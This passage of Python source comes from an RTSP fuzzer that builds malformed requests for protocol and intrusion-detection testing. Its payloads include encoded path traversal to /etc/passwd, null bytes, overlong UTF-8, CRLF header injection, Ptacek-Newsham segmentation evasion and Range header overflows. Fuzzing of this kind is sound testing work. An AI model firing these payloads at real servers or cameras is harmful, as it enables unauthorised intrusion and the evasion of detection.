    """Percent-encoding, double-encoding, mixed case scheme, null bytes,
    path traversal with encoding, overlong UTF-8."""
    if payload_override is not None:
        host = _rand_ip()
        cseq = _rand_cseq()
        encoded = "".join(f"%{b:02X}" for b in payload_override)
        uri = f"rtsp://{host}:{_RTSP_PORT}/{encoded}"
        payload = f"DESCRIBE {uri} RTSP/1.0\r\nCSeq: {cseq}\r\n\r\n"
        return payload.encode("utf-8", errors="replace")[:_MAX_SEG], _RTSP_PORT
    variant = random.randint(0, 7)
    host = _rand_ip()
    cseq = _rand_cseq()

    if variant == 0:
        # Percent-encoded path components
        uri = f"rtsp://{host}:{_RTSP_PORT}/%6D%65%64%69%61%2E%6D%70%34"  # media.mp4
        payload = f"DESCRIBE {uri} RTSP/1.0\r\nCSeq: {cseq}\r\n\r\n"
    elif variant == 1:
        # Double-encoding
        uri = f"rtsp://{host}:{_RTSP_PORT}/%252e%252e/%252e%252e/etc/passwd"
        payload = f"DESCRIBE {uri} RTSP/1.0\r\nCSeq: {cseq}\r\n\r\n"
    elif variant == 2:
        # Mixed case scheme (RtSp://)
        schemes = ["RtSp", "RTSP", "Rtsp", "rTsP", "rtsP"]
        uri = f"{random.choice(schemes)}://{host}:{_RTSP_PORT}/media.mp4"
        payload = f"DESCRIBE {uri} RTSP/1.0\r\nCSeq: {cseq}\r\n\r\n"
    elif variant == 3:
        # Null bytes in URI path
        uri = f"rtsp://{host}:{_RTSP_PORT}/media%00.mp4"
        payload = f"DESCRIBE {uri} RTSP/1.0\r\nCSeq: {cseq}\r\n\r\n"
    elif variant == 4:
        # Path traversal with encoding
        traversal = "%2e%2e/" * random.randint(5, 20) + "etc/passwd"
        uri = f"rtsp://{host}:{_RTSP_PORT}/{traversal}"
        payload = f"DESCRIBE {uri} RTSP/1.0\r\nCSeq: {cseq}\r\n\r\n"
    elif variant == 5:
        # Overlong UTF-8 encoding of '/' (0x2F)
        # 2-byte overlong: C0 AF, 3-byte overlong: E0 80 AF
        overlong = random.choice([b"\xc0\xaf", b"\xe0\x80\xaf"])
        uri_bytes = f"rtsp://{host}:{_RTSP_PORT}/media".encode() + overlong + b"stream"
        payload_bytes = b"DESCRIBE " + uri_bytes + b" RTSP/1.0\r\nCSeq: " + cseq.encode() + b"\r\n\r\n"
        return payload_bytes[:_MAX_SEG], _RTSP_PORT
    elif variant == 6:
        # Fragment identifier (undefined behavior in RTSP)
        uri = f"rtsp://{host}:{_RTSP_PORT}/media.mp4#fragment{random.randint(1,99)}"
        payload = f"DESCRIBE {uri} RTSP/1.0\r\nCSeq: {cseq}\r\n\r\n"
    else:
        # Oversized percent-encoded URI
        encoded_chars = "".join(f"%{random.randint(0x20, 0x7E):02X}" for _ in range(random.randint(2000, 5000)))
        uri = f"rtsp://{host}:{_RTSP_PORT}/{encoded_chars}"
        payload = f"DESCRIBE {uri} RTSP/1.0\r\nCSeq: {cseq}\r\n\r\n"

    return payload.encode("utf-8", errors="replace")[:_MAX_SEG], _RTSP_PORT


# ── Strategy 12: crlf_header_injection ─────────────────────────────────────

def _build_crlf_header_injection():
    """CRLF in header values, Unicode line separators (U+2028/2029/0085),
    bare LF/CR, header folding, response injection."""
    variant = random.randint(0, 7)
    uri = _rand_uri()
    cseq = _rand_cseq()

    if variant == 0:
        # CRLF injection in header value to inject extra header
        payload = (
            f"OPTIONS {uri} RTSP/1.0\r\n"
            f"CSeq: {cseq}\r\n"
            f"User-Agent: Legit\r\nX-Injected: evil\r\n"
            f"\r\n"
        )
    elif variant == 1:
        # CRLF to inject a fake RTSP response
        payload = (
            f"OPTIONS {uri} RTSP/1.0\r\n"
            f"CSeq: {cseq}\r\n"
            f"User-Agent: Legit\r\n\r\nRTSP/1.0 200 OK\r\nCSeq: {cseq}\r\nPublic: DESCRIBE, SETUP, PLAY\r\n"
            f"\r\n"
        )
    elif variant == 2:
        # Unicode line separators (U+2028, U+2029, U+0085)
        separators = ["\u2028", "\u2029", "\u0085"]
        sep = random.choice(separators)
        payload = (
            f"OPTIONS {uri} RTSP/1.0\r\n"
            f"CSeq: {cseq}\r\n"
            f"User-Agent: Before{sep}After{sep}More\r\n"
            f"\r\n"
        )
    elif variant == 3:
        # Bare LF without CR
        payload = (
            f"OPTIONS {uri} RTSP/1.0\n"
            f"CSeq: {cseq}\n"
            f"User-Agent: Fuzzer\n"
            f"\n"
        )
    elif variant == 4:
        # Bare CR without LF
        payload = (
            f"OPTIONS {uri} RTSP/1.0\r"
            f"CSeq: {cseq}\r"
            f"User-Agent: Fuzzer\r"
            f"\r"
        )
    elif variant == 5:
        # Header folding (continuation line with leading whitespace)
        payload = (
            f"OPTIONS {uri} RTSP/1.0\r\n"
            f"CSeq: {cseq}\r\n"
            f"User-Agent: Part1\r\n"
            f" Part2\r\n"
            f"\tPart3\r\n"
            f"   Part4\r\n"
            f"\r\n"
        )
    elif variant == 6:
        # Percent-encoded CRLF in URI
        payload = (
            f"DESCRIBE rtsp://{_rand_ip()}:%0d%0aX-Injected:%20evil{_RTSP_PORT}/media.mp4 RTSP/1.0\r\n"
            f"CSeq: {cseq}\r\n"
            f"\r\n"
        )
    else:
        # Multiple CRLF injection points
        payload = (
            f"OPTIONS {uri} RTSP/1.0\r\n"
            f"CSeq: {cseq}\r\n"
            f"Session: valid\r\nX-Evil1: injected1\r\n"
            f"Accept: */*\r\nX-Evil2: injected2\r\n"
            f"User-Agent: ok\r\nX-Evil3: injected3\r\n"
            f"\r\n"
        )

    return payload.encode("utf-8", errors="replace")[:_MAX_SEG], _RTSP_PORT


# ── Strategy 13: tcp_segmentation_evasion ──────────────────────────────────

def _build_tcp_segmentation_evasion(payload_override=None):
    """Ptacek & Newsham: tiny segments, out-of-order, overlap, TTL
    insertion, pause/timeout, split at protocol boundaries.
    NOTE: Returns the full payload as one block; actual TCP segmentation
    is handled by the transport layer (wrap_tcp_session splits it)."""
    if payload_override is not None:
        uri = _rand_uri()
        cseq = _rand_cseq()
        payload = (
            f"DESCRIBE {uri} RTSP/1.0\r\n"
            f"CSeq: {cseq}\r\n"
            f"X-Payload: "
        ).encode() + payload_override + b"\r\n\r\n"
        return payload[:_MAX_SEG], _RTSP_PORT
    variant = random.randint(0, 7)
    uri = _rand_uri()
    cseq = _rand_cseq()

    if variant == 0:
        # Full RTSP message but with markers suggesting tiny segment split
        # (1-byte TCP segments in real delivery)
        payload = _basic_headers("DESCRIBE", uri, cseq)
    elif variant == 1:
        # Split at method/URI boundary (pad with extra spaces to mark split point)
        payload = f"DESCRIBE {uri} RTSP/1.0\r\nCSeq: {cseq}\r\n\r\n"
    elif variant == 2:
        # Split mid-header-name (e.g. "CS" | "eq: 1")
        payload = f"DESCRIBE {uri} RTSP/1.0\r\nCSeq: {cseq}\r\nUser-Agent: Fuzzer\r\n\r\n"
    elif variant == 3:
        # Large payload that would require many segments
        padding = "X-Pad: " + "P" * random.randint(5000, 20000) + "\r\n"
        payload = (
            f"DESCRIBE {uri} RTSP/1.0\r\n"
            f"CSeq: {cseq}\r\n"
            f"{padding}"
            f"\r\n"
        )
    elif variant == 4:
        # Interleaved binary between RTSP headers (forces framing confusion)
        part1 = f"DESCRIBE {uri} RTSP/1.0\r\nCSeq: {cseq}\r\n"
        binary = struct.pack("!BBH", 0x24, 0, 50) + os.urandom(50)
        part2 = "Accept: application/sdp\r\n\r\n"
        return (part1.encode() + binary + part2.encode())[:_MAX_SEG], _RTSP_PORT
    elif variant == 5:
        # Duplicate RTSP request (overlap simulation)
        req = _basic_headers("OPTIONS", uri, cseq)
        payload = req + req  # duplicate
    elif variant == 6:
        # Request with null bytes between headers (segment boundary marker)
        payload = (
            f"DESCRIBE {uri} RTSP/1.0\r\n"
            f"CSeq: {cseq}\r\n"
            f"\x00\x00\x00\x00"
            f"Accept: application/sdp\r\n"
            f"\r\n"
        )
    else:
        # Very small request (under typical minimum segment check)
        payload = f"OPTIONS * RTSP/1.0\r\nCSeq: 1\r\n\r\n"

    return payload.encode("utf-8", errors="replace")[:_MAX_SEG], _RTSP_PORT


# ── Strategy 14: range_time_format_abuse ───────────────────────────────────

def _build_range_time_format_abuse():
    """NPT/SMPTE/clock overflow, negative range, mixed formats,
    unsupported format, Range on wrong methods."""
    variant = random.randint(0, 7)
    uri = _rand_uri()
    cseq = _rand_cseq()
    session = _rand_session_id()

    if variant == 0:
        # NPT overflow
        npt_val = random.choice([
            f"npt={'9' * 50}-", "npt=99999999999999999-",
            "npt=-1-", "npt=inf-inf",
        ])
        payload = _basic_headers("PLAY", uri, cseq, session=session, extra=[
            f"Range: {npt_val}",
        ])
    elif variant == 1:
        # SMPTE overflow
        smpte_val = random.choice([
            "smpte=99:99:99:99.99-", "smpte=-1:00:00:00-",
            "smpte=00:00:00:00-99:99:99:99",
            f"smpte={'9' * 20}:00:00:00-",
        ])
        payload = _basic_headers("PLAY", uri, cseq, session=session, extra=[
            f"Range: {smpte_val}",
        ])
    elif variant == 2:
        # UTC clock overflow
        clock_val = random.choice([
            "clock=99999999T999999Z-", "clock=00000000T000000Z-",
            "clock=19700101T000000Z-29991231T235959Z",
            f"clock={'9' * 30}T000000Z-",
        ])
        payload = _basic_headers("PLAY", uri, cseq, session=session, extra=[
            f"Range: {clock_val}",
        ])
    elif variant == 3:
        # Negative range (end before start)
        payload = _basic_headers("PLAY", uri, cseq, session=session, extra=[
            "Range: npt=100-50",
        ])
    elif variant == 4:
        # Mixed formats in same Range
        payload = _basic_headers("PLAY", uri, cseq, session=session, extra=[
            "Range: npt=0-10, smpte=00:00:00:00-00:00:10:00",
        ])
    elif variant == 5:
        # Unsupported format
        payload = _basic_headers("PLAY", uri, cseq, session=session, extra=[
            f"Range: {random.choice(['bytes=0-100', 'frames=0-100', 'unknown=start-end', 'npt'])}",
        ])
    elif variant == 6:
        # Range on wrong method (OPTIONS shouldn't have Range)
        payload = _basic_headers("OPTIONS", uri, cseq, extra=[
            "Range: npt=0-100",
        ])
    else:
        # Multiple Range headers
        payload = (
            f"PLAY {uri} RTSP/1.0\r\n"
            f"CSeq: {cseq}\r\n"
            f"Session: {session}\r\n"
            f"Range: npt=0-10\r\n"
            f"Range: npt=20-30\r\n"
            f"Range: smpte=00:00:00:00-\r\n"
            f"\r\n"
        )

    return payload.encode("utf-8", errors="replace")[:_MAX_SEG], _RTSP_PORT


# ── Strategy dispatch map ─────────────────────────────────────────────────

_STRATEGY_MAP = {
    "request_line_malformation":    _build_request_line_malformation,
    "content_length_smuggling":     _build_content_length_smuggling,
    "transport_header_overflow":    _build_transport_header_overflow,
    "interleaved_binary_injection": _build_interleaved_binary_injection,
    "session_state_confusion":      _build_session_state_confusion,
    "http_tunneling_abuse":         _build_http_tunneling_abuse,
    "sdp_body_malformation":        _build_sdp_body_malformation,
    "oversized_header_overflow":    _build_oversized_header_overflow,
    "cseq_pipelining_abuse":        _build_cseq_pipelining_abuse,
    "method_verb_fuzzing":          _build_method_verb_fuzzing,
    "uri_encoding_evasion":         _build_uri_encoding_evasion,
    "crlf_header_injection":        _build_crlf_header_injection,
    "tcp_segmentation_evasion":     _build_tcp_segmentation_evasion,
    "range_time_format_abuse":      _build_range_time_format_abuse,
}


_RTSP_OVERRIDE_CAPABLE = frozenset([
    "content_length_smuggling", "interleaved_binary_injection",
    "uri_encoding_evasion", "tcp_segmentation_evasion",
])

def build_rtsp_payload(strategy, payload_override=None):
    """Build one fuzzed RTSP payload for the given strategy.
    Returns (payload_bytes, dst_port)."""
    func = _STRATEGY_MAP.get(strategy)
    if func is None:
        raise ValueError(f"Unknown RTSP strategy: {strategy}")
    if payload_override is not None and strategy in _RTSP_OVERRIDE_CAPABLE:
        return func(payload_override=payload_override)
    return func()


# ── Mutator class ─────────────────────────────────────────────────────────

class RtspMutator:
    def __init__(self, external_weights=None, bandit=None):
        self.strategies = RTSP_STRATEGIES
        self._external_weights = external_weights
        self._bandit = bandit

    @property
    def weights(self):
        if self._external_weights:
            return [self._external_weights.get(s, 5) for s in self.strategies]
        return RTSP_WEIGHTS

    def mutate(self, payload_override=None):
        """Returns (payload_bytes, strategy_name, dst_port)."""
        if self._bandit:
            strategy = self._bandit.select_with_weights(self._external_weights or {})
        else:
            strategy = random.choices(self.strategies, weights=self.weights, k=1)[0]
        payload, dst_port = build_rtsp_payload(strategy, payload_override=payload_override)
        return payload, strategy, dst_port
